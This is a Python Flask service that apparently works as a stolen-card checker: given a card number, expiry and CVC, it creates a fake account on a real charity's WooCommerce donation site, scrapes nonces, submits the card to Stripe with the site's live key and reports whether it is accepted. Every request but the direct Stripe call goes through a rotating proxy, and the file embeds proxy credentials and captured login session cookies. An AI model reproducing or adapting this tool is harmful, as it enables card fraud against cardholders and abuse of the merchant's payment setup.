import requests
proxy = "http://rvvcdzdv-rotate:izc9l0vvhgro@p.webshare.io:80"
proxies = {
    "http": proxy,
    "https": proxy
}
try:
	import requests
	import re,json
	import random
	import time
	import string
	import base64
	from bs4 import BeautifulSoup
	from user_agent import *
	import random
	import string
	import requests
	import requests,user_agent,re,base64,json,random
except:
	pass
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/stripe', methods=['GET', 'POST'])
def testapi():
	try:
		import requests
		import re,json
		import random
		import time
		import string
		import base64
		from bs4 import BeautifulSoup
	#	from user_agent import *
		import random
		import string
		import requests
		import requests,user_agent,re,base64,json,random
		card_line = request.args.get('cc')
		if not card_line:
			return jsonify({"error": "No JSON data received"}), 400
		# فصل القيم
		card, exp_month, exp_year, cvc = card_line.strip().split('|')
		
		# معالجة السنة (YY → YYYY)
		if len(exp_year) == 2:
		    exp_year = "20" + exp_year
		
		# استخدام القيم مباشرة
	
		rr = requests.session()
		username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
		email = f"{username}@gmail.com"
		url = "https://www.hardyglobalmissions.org/en/my-account/add-payment-method/"
		
		headers = {
		  'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
		}
		
		response = rr.get(url, headers=headers, proxies=proxies)
		nonce = re.search('name="woocommerce-register-nonce" value="([^"]+)"', response.text).group(1)
		import requests
		
		url = "https://www.hardyglobalmissions.org/en/my-account/add-payment-method/"
		
		payload = {
		  'email': email,
		  'password': username,
		  'wc_order_attribution_source_type': "typein",
		  'wc_order_attribution_referrer': "https://www.hardyglobalmissions.org/en/",
		  'wc_order_attribution_utm_campaign': "(none)",
		  'wc_order_attribution_utm_source': "(direct)",
		  'wc_order_attribution_utm_medium': "(none)",
		  'wc_order_attribution_utm_content': "(none)",
		  'wc_order_attribution_utm_id': "(none)",
		  'wc_order_attribution_utm_term': "(none)",
		  'wc_order_attribution_utm_source_platform': "(none)",
		  'wc_order_attribution_utm_creative_format': "(none)",
		  'wc_order_attribution_utm_marketing_tactic': "(none)",
		  'wc_order_attribution_session_entry': "https://www.hardyglobalmissions.org/en/my-account/add-payment-method/",
		  'wc_order_attribution_session_start_time': "2026-01-14 20:44:18",
		  'wc_order_attribution_session_pages': "1",
		  'wc_order_attribution_session_count': "1",
		  'wc_order_attribution_user_agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
		  'woocommerce-register-nonce': nonce,
		  '_wp_http_referer': "/en/my-account/add-payment-method/",
		  'register': "Register",
		  'fHTA_gLMEti': "Mhvkglry0.H",
		  'gKpTukErW': "vSl]4cCTBz7wIq",
		  'fAFOZsKYEpLyDr_g': "C1vn9NZ.AhybF",
		  'fHTA_gLMEti': "Mhvkglry0.H",
		  'gKpTukErW': "vSl]4cCTBz7wIq",
		  'fAFOZsKYEpLyDr_g': "C1vn9NZ.AhybF"
		}
		
		headers = {
		  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
		  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		  'cache-control': "max-age=0",
		  'sec-ch-ua': "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
		  'sec-ch-ua-mobile': "?1",
		  'sec-ch-ua-platform': "\"Android\"",
		  'save-data': "on",
		  'upgrade-insecure-requests': "1",
		  'origin': "https://www.hardyglobalmissions.org",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "navigate",
		  'sec-fetch-user': "?1",
		  'sec-fetch-dest': "document",
		  'referer': "https://www.hardyglobalmissions.org/en/my-account/add-payment-method/",
		  'accept-language': "en-SD,en;q=0.9,ar-SD;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5",
		#  'Cookie': "_gcl_au=1.1.1201910326.1768400833; _ga=GA1.1.1998930179.1768400834; _icl_visitor_lang_js=en_sd; CookieLawInfoConsent=e30=; viewed_cookie_policy=yes; _fbp=fb.1.1768400838148.933807670716257961; ZBTlsjmgQYC=5VR8%2AX; QIWNRv=OIixkUmX; YkFLJNS=HLobU8cimxdA6y; wcml_client_currency=USD; wcml_client_currency_language=en; __stripe_mid=31efebf5-02b8-48c7-9449-0c8e61c8b11d5847b3; _ga_1NLLSB0X4S=GS2.1.s1768400833$o1$g1$t1768400852$j41$l0$h0; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-14%2020%3A44%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hardyglobalmissions.org%2Fen%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.hardyglobalmissions.org%2Fen%2F; sbjs_first_add=fd%3D2026-01-14%2020%3A44%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hardyglobalmissions.org%2Fen%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.hardyglobalmissions.org%2Fen%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hardyglobalmissions.org%2Fen%2Fmy-account%2F; wpml_browser_redirect_test=0; wp-wpml_current_language=en"
		}
		
		response = rr.post(url, data=payload, cookies=rr.cookies, headers=headers, proxies=proxies)
		
		#print(response.text)
		#print(nonce)
		import requests
		
		url = "https://www.hardyglobalmissions.org/en/my-account-2/add-payment-method/"
		
		headers = {
		  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
		  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		  'sec-ch-ua': "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
		  'sec-ch-ua-mobile': "?1",
		  'sec-ch-ua-platform': "\"Android\"",
		  'save-data': "on",
		  'upgrade-insecure-requests': "1",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "navigate",
		  'sec-fetch-user': "?1",
		  'sec-fetch-dest': "document",
		  'referer': "https://www.hardyglobalmissions.org/en/my-account-2/payment-methods/",
		  'accept-language': "en-SD,en;q=0.9,ar-SD;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5",
		#  'Cookie': "_gcl_au=1.1.1201910326.1768400833; _ga=GA1.1.1998930179.1768400834; _icl_visitor_lang_js=en_sd; CookieLawInfoConsent=e30=; viewed_cookie_policy=yes; _fbp=fb.1.1768400838148.933807670716257961; ZBTlsjmgQYC=5VR8%2AX; QIWNRv=OIixkUmX; YkFLJNS=HLobU8cimxdA6y; wcml_client_currency=USD; wcml_client_currency_language=en; __stripe_mid=31efebf5-02b8-48c7-9449-0c8e61c8b11d5847b3; _ga_1NLLSB0X4S=GS2.1.s1768400833$o1$g1$t1768400852$j41$l0$h0; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-14%2020%3A44%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hardyglobalmissions.org%2Fen%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.hardyglobalmissions.org%2Fen%2F; sbjs_first_add=fd%3D2026-01-14%2020%3A44%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hardyglobalmissions.org%2Fen%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.hardyglobalmissions.org%2Fen%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36; wp-wpml_current_language=en; cerber_groove=b7f8d2454a22cd7ab8505c0a653d60ee; cerber_groove_x_ebcoszFqUgp8K4mdErxR6VIW=LSeod7Z6uAnTUxXRhqcIyjv8POm23JD; wordpress_logged_in_03bdc8d0061e256ffff797e07629f54f=yadfdhgff%7C1769633091%7CuDYqBlPBz5gSkBZfuu9wiNAwPcBjOgDbdSKyyYKtuGO%7C25315e3312607968ce9ff6bcc80cf1d9c704a90e955dfb913e5d47a7a6c78e54; wp_automatewoo_visitor_03bdc8d0061e256ffff797e07629f54f=f7gsmp948160g8q2t5ac; wp_automatewoo_session_started=1; mautic_device_id=5tuk77m82xt8pad60vzvqkd; __stripe_sid=ab578716-ba06-4502-8d32-a5436a02cfb2ab2f52; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hardyglobalmissions.org%2Fen%2Fmy-account-2%2Fpayment-methods%2F; wpml_browser_redirect_test=0; mtc_id=25613"
		}
		
		response = rr.get(url, cookies=rr.cookies, headers=headers, proxies=proxies)
		noncee=re.findall(r'createAndConfirmSetupIntentNonce":"(.*?)"',response.text)[0]
		print(noncee)
		url = "https://api.stripe.com/v1/payment_methods"
		
		payload = {
		  'type': "card",
		  'card[number]': card,
		  'card[cvc]': cvc,
		  'card[exp_year]': exp_year,
		  'card[exp_month]': exp_month,
		  'allow_redisplay': "unspecified",
		  'billing_details[address][postal_code]': "10090",
		  'billing_details[address][country]': "US",
		  'payment_user_agent': "stripe.js/a3e7d2f3d5; stripe-js-v3/a3e7d2f3d5; payment-element; deferred-intent",
		  'referrer': "https://www.hardyglobalmissions.org",
		  'time_on_page': "30652",
		  'client_attribution_metadata[client_session_id]': "8f7951db-4925-450d-bf0d-b2b0827cdc97",
		  'client_attribution_metadata[merchant_integration_source]': "elements",
		  'client_attribution_metadata[merchant_integration_subtype]': "payment-element",
		  'client_attribution_metadata[merchant_integration_version]': "2021",
		  'client_attribution_metadata[payment_intent_creation_flow]': "deferred",
		  'client_attribution_metadata[payment_method_selection_flow]': "merchant_specified",
		  'client_attribution_metadata[elements_session_config_id]': "38cbf08a-b9db-418b-a58f-669e8ab5acdb",
		  'client_attribution_metadata[merchant_integration_additional_elements][0]': "payment",
		  'guid': "b736b018-9f5f-4ea3-bdae-eb1c148ee4a14ac142",
		  'muid': "75c14f5b-2368-4e9d-b04c-584086ad00ac221a99",
		  'sid': "92cd15b2-917d-45ef-8ecf-9ddf0c61d4066dbf13",
		  'key': "pk_live_vjwPCtA29rt4etzXeH61I54H",
		  '_stripe_version': "2024-06-20",
		 # 'radar_options[hcaptcha_token]': "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY4MzUzOTY2LCJjZGF0YSI6IkZja2h4MkExQVduNDNlQUZLYXp6TXFySlVtbkNzdlBvQm9UWllFV21acHhkMG5uN29NVm12K25jZ0MvTk5zK3pScUNXOVZLb0ZKUW1Db0Y1NmlpNUVpWmFnRTNRV1dyY3BhWCsxQnppcVpYUnZaRUkwbHJ4YTBNMU91K2E3YzYrK2t5US9FWjN5S3RoeEFSN0xQZU9hNFFSYStHWVVHVisrcHRFT3JKVWozVVJDelMxbFBmU29yVmFYNHpGQjBFTGdDdmdoRE5NOXRUOFB0ZFUiLCJwYXNza2V5IjoiUitlM1VaTloyWS9TSS9kbkNEcUVETkRTQXdTdUFPeGEreVFOS2owTE5jM3kxeUNhTnZEOXJqc3lLVzYzRTJReC81ZTZKeUlMbFF5MkgxdytkeCtRdVNMN0pFd3ZlcUVNQkRodzhrRFBkVlc5aWpqY1VTQ0JIK2RCMEVlcXlXclRNc0ZLZi8vQit4TFplc1ozOEF5aUxEQkk4SWIyblFoaUpNUFBUdTlQT2orbllWdmo5d2JhNU5WSWM1RkNHb3RCeDU2RWZXR2ZjMnB1SmhpTUphMWtPUjhZdlM0NDR1cTB3bVQ3dWpITlRXS3JZZ0ZFbU1jZG9LOEpUVitkZm53MUxsQ3Vmb0lrdnZXaWFneElaV0lRbW5CTUd4ZzZ3ekxQZkcrcHVDRFhxb2xxalJKejdMMDRSaW4vRHRKYjk1dW9XcTFXZHREV1ZJdUdHeFp2RTIwSEFJaVdYMmhPdkdEenhiQVM0cUxvYm03cUF3cWpIREIvV25KWFlOK2xNL1VYYk5tMWlMUnRoZHJ6Vk50UTFPTUxldmdySnc1NVZONVp6d3FTUENtMlRwQUhvclhRd3Z0Z3BsZFBXVU5iOEhudWM5MUw1anVkQVhPR0FPN0RGNzlPbi9MQys4azh4MTM3clRuY2NqWmcxUFowMWo3dkhsU1hONnB1Z2Q4MFdBUDYyazZIMGFkeHl1SS85b1QrbWE4NWRoMVRTUFpKU2s0TFRmdUFqcVRqdTdnb2Q3SlQ2UWxscy9rdTc2NVBabG9SMmpTR0pBTmxXcEx6bEpTdjk2dnZQakcxbmJ5aS9tdXBjb1J5eUlpeUdLdVZxNEs2WGZhNmZGR0J0Y1VkdTZNOG9YQ1diTjN5ZnRNTHpFbHduZ2FFcmkveENqOFFyUmE3YTF6ZlBBbkZJSENtL1IyeFNNZnBJVHpsaTljTzJGd2NOSlVCekI4aU9CME9wdXJVdkRnMHdMOUU3TUpzcWtEeVJLbzRiUDRrU1NWUXBVTFUwVml4Z0Z2MFFUREZGWU54d1Vya0FYUlVCTkdBdXNvcDFkVlRFWVQzcmdlbjFuU0h5TFJiNUlUNi8rWFh4UGNGZ0NsQVVPd0FZbzZhTkRpcEhPNWk0azVTeGx1d2pod05nV1lscDliRCtrK1RacFVCTjFxVlVHM1lYSHlQcWdMTW9aZjFPZ05RZkhsZW83UWNsOEV4aFNpb2NNbldzOUZNeFZoQWptWU1BRGZmVkluTmw2bkV0dHVYRUtLM1pBSFl0TnJUcSs0NFEvbUVKYU5peUlQMFJ6TlBZdSs1dERWMmN3VWJmVFViUmNMTzdhOWx0QlpEcnlrRUNEbjZCUXFuVDN0UU51RjZhd05KT3JFakJWQ05sY1BrN1RERFhqektVMkNXdVZqZXBFVXJLRmNOcUI1dFVFMzVEdi9JL2toYlplQUw1LzRjTms5VDBXSjZNbFFIQ0dUL2N0VEIyd1N5Y0tjOE55ejIzTjVkcjRlNVRTS3U1eCtvZXNJQ3FqQ2d1YU82ZmJIK0hxcHFRVkovMkF1eGVMUzN3dWJ6R1JPT1hLZ0M1K25rMk05RVdpN21SODlHWDlkWUJvR0FJbk9uUVV4R1BraUdGTG9yY3ZGVTl3MTFvdW1oVVB2NE5ZelNHR2JNRUNiMTJYSTdlakNSTkMyQ1F2aUl6TXlBdlJIcCtFU1g2TFBodlZYWGFRVDVxbjNYSWtjdFdqOXFuZ2lVc3pITG1SNWZDQk5PUnFKR250Si9HV3dKc01BclRvandEWjFLcVdELzUvZ2t1NEhXMzQ1YVVEaEhXWjFpdDZsZUxiVDl5VFJkbnptSW1wK2FHeHcxOUdVa2NSNEpRYzhCNC9IcTk2d29BS2x1di9DQzVuOGNkUElra295Zzc5SWdCbDJiRzFXRVplMDFjb2d2VW5hYXZlaVF2ZVRIY2FBTWhOVzhaZlJZWXhjKzhmRm1STUFtbHBQNmxvNlNCVXh1Q2VhSkVSRWhJZUJsNHdzaExXaDZkS2l0UkRQUGZXMTdjUVRmTkJHcVZOZytBd1FWeWtNYU5nNmphaHNoS0gxK2h2S1ExaTdFVndSUzNnajZaM2dVVE9Rb1d3SGlGYW1mcnk2WWZkVHhoTUY5Y2lXdG5yc3prVXNFeEVNY2ZUNjZmSzY0eW5vanArckFJY3FhZU5makR5OEV0dDJNdFE4T0s1TU5wVWZXSlorWU9IK3IycXNPRWJQazZyeWNrclhYRHBpRE1tU2NVK2kySmN5RFBhcE5OdU0zMG1BTlhwLzhySnBPMXIwQ01scGNneG1RYW9NRW8xWHBUbFJRbFBLQ0dPOEk5NllvK0h6bkd5M2JjVUR4aFYvRnV2blZmTkxzdlI0aGszUGJVSnNQMW91VjNHMDFKcm9Ma3FZQ29mc1k0NU93M3JONUxlMGgyZzlLbDRmanl0UUJicUtrcjJGcFdmZ1FhamVXdFZxT2RNQTRoVExBc3pRNU5MK3VQYjcxRzlLUm16VUlOdTBXbGh5NGw1WkZ1S1BVS0dXQko4RSt5ZlJiMGtxczlEQ053ckJPdGlqQ0l2L08xNDJBdmJTYjRWeFU3Z0dORkM2T0lGdjl6ZHVXWEx6Vkg0aEFiZE1zR0l1SEREelh2UnF2c3dkQmFEa1V6UFJqelRETkFmRT0iLCJrciI6IjMzNDMxNzdmIiwic2hhcmRfaWQiOjMzOTUxMDMwM30.UaD8fTpB8cPDyktkxAkP75170c85Jfg0exMbHe7qN5o"
		}
		
		headers = {
		  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
		  'Accept': "application/json",
		  'sec-ch-ua': "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
		  'sec-ch-ua-mobile': "?1",
		  'sec-ch-ua-platform': "\"Android\"",
		  'origin': "https://js.stripe.com",
		  'sec-fetch-site': "same-site",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://js.stripe.com/",
		  'accept-language': "en-SD,en;q=0.9"
		}
		
		response = requests.post(url, data=payload, headers=headers)
		id = response.json()['id']
		import requests
		
		url = "https://www.hardyglobalmissions.org/wp-admin/admin-ajax.php"
		
		payload = {
		  'action': "wc_stripe_create_and_confirm_setup_intent",
		  'wc-stripe-payment-method': id,
		  'wc-stripe-payment-type': "card",
		  '_ajax_nonce': noncee
		}
		
		headers = {
		  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
		  'sec-ch-ua': "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
		  'x-requested-with': "XMLHttpRequest",
		  'sec-ch-ua-mobile': "?1",
		  'sec-ch-ua-platform': "\"Android\"",
		  'origin': "https://www.hardyglobalmissions.org",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://www.hardyglobalmissions.org/en/my-account-2/add-payment-method/",
		  'accept-language': "en-SD,en;q=0.9",
		  #Cookie': "wordpress_sec_03bdc8d0061e256ffff797e07629f54f=yasir.yadrt%7C1769563266%7CDjWD2xnzH0H4D545P9ZuJ5KAGjt3wvWLHoHl8t8ZpQs%7C3488c414ec21dab832df772b8f6e5b4e7f9742806ac834345bcd03f030ad8855; ZBTlsjmgQYC=5VR8%2AX; QIWNRv=OIixkUmX; YkFLJNS=HLobU8cimxdA6y; wcml_client_currency=USD; wcml_client_currency_language=en; _gcl_au=1.1.2009488872.1768353447; _ga=GA1.1.1491892612.1768353448; _fbp=fb.1.1768353448762.995111300459667451; mtc_id=25603; mautic_device_id=l6mzr7rufiztg48x0x7uo9q; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-14%2001%3A17%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hardyglobalmissions.org%2Fen%2Fproduto%2Fdonate-as-much-as-you-wish%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2026-01-14%2001%3A17%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hardyglobalmissions.org%2Fen%2Fproduto%2Fdonate-as-much-as-you-wish%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36; _icl_visitor_lang_js=en_sd; wp-wpml_current_language=en; CookieLawInfoConsent=e30=; viewed_cookie_policy=yes; __stripe_mid=75c14f5b-2368-4e9d-b04c-584086ad00ac221a99; __stripe_sid=92cd15b2-917d-45ef-8ecf-9ddf0c61d4066dbf13; wp_woocommerce_session_03bdc8d0061e256ffff797e07629f54f=t_4a5019e25a4fb397706204dcc82489%7C1768526274%7C1768439874%7C%24generic%24hwv8kOjdt2OBr3Vn8V9cliixWk9EABcEmoX1tPYK; wp_automatewoo_visitor_03bdc8d0061e256ffff797e07629f54f=ipa38lm4a1qj5gn5mtmu; wp_automatewoo_session_started=1; cerber_groove=b7f8d2454a22cd7ab8505c0a653d60ee; cerber_groove_x_ebcoszFqUgp8K4mdErxR6VIW=LSeod7Z6uAnTUxXRhqcIyjv8POm23JD; wordpress_logged_in_03bdc8d0061e256ffff797e07629f54f=yasir.yadrt%7C1769563266%7CDjWD2xnzH0H4D545P9ZuJ5KAGjt3wvWLHoHl8t8ZpQs%7Cf38c3bf75555f6479a1b4e006b241dc3ff73c227ddfc37dfc4bab9033c16e77c; _ga_1NLLSB0X4S=GS2.1.s1768353447$o1$g1$t1768353680$j60$l0$h0; sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hardyglobalmissions.org%2Fen%2Fmy-account-2%2Fadd-payment-method%2F; wpml_browser_redirect_test=0"
		}
		
		response = rr.post(url, data=payload, cookies=rr.cookies, headers=headers, proxies=proxies)
		if 'succeeded' in response.text:
			return jsonify({
	        "success": True,
	        "Response":"Payment Method Added Successfully.",
	        "Payment gateway": "STRIPE AUTHE"
	    })
		else:
			return (response.json())
	except:
		pass
if __name__ == '__main__':
    app.run()
#print(response.text)
